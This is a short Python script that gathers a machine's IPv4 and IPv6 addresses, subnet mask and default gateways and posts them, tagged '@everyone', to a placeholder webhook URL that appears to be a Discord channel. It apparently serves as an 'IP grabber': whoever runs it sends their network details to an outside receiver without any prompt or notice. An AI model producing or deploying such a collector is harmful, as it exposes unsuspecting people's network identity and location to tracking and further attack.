import requests
import socket
import psutil
import netifaces
import time

def get_IPv6():
        ipv6_addresses = [addr[4][0] for addr in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6) if not addr[4][0].startswith('fe80::')]  
        global_ipv6_addresses = [addr for addr in ipv6_addresses if not addr.startswith('fe80::')]   
        if global_ipv6_addresses:
            return global_ipv6_addresses[0]
        
def get_link_local_IPv6():
    ipv6_address = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)[0][4][0]
    return ipv6_address

def get_IPv4():
    ipv4_address = socket.gethostbyname(socket.gethostname())
    return ipv4_address

def get_subnet_mask():
    interfaces = psutil.net_if_addrs()
    for addrs in interfaces.values():
        for addr in addrs:
            if addr.family == socket.AF_INET:
                return addr.netmask

def get_default_gateway_IPv4():
    gateways = netifaces.gateways()
    ipv4_gateway = gateways.get('default', {}).get(netifaces.AF_INET, [None])[0]
    return ipv4_gateway
     
def get_default_gateway_IPv6():
    gateways = netifaces.gateways()
    ipv6_gateway = gateways.get('default', {}).get(netifaces.AF_INET6, [None])[0]
    return ipv6_gateway

Link_local_IPv6 = get_link_local_IPv6()
IPv6 = get_IPv6()
IPv4 = get_IPv4()
subnet_mask = get_subnet_mask()
deafult_gateway_IPv4 = get_default_gateway_IPv4()
deafult_gateway_IPv6 = get_default_gateway_IPv6()

webhook_url = "UR_WEBHOOK_URL"

payload = {
    "content": f"@everyone\nIPv6 Address = {IPv6}\nLink-local IPv6 Address = {Link_local_IPv6}\nIPv4 Address = {IPv4}\nSubnet Mask = {subnet_mask}\nDeafult Gateway IPv6 = {deafult_gateway_IPv6}\nDeafult Gateway IPv4 = {deafult_gateway_IPv4}"
}

response = requests.post(webhook_url, json=payload)
time.sleep(0.1)
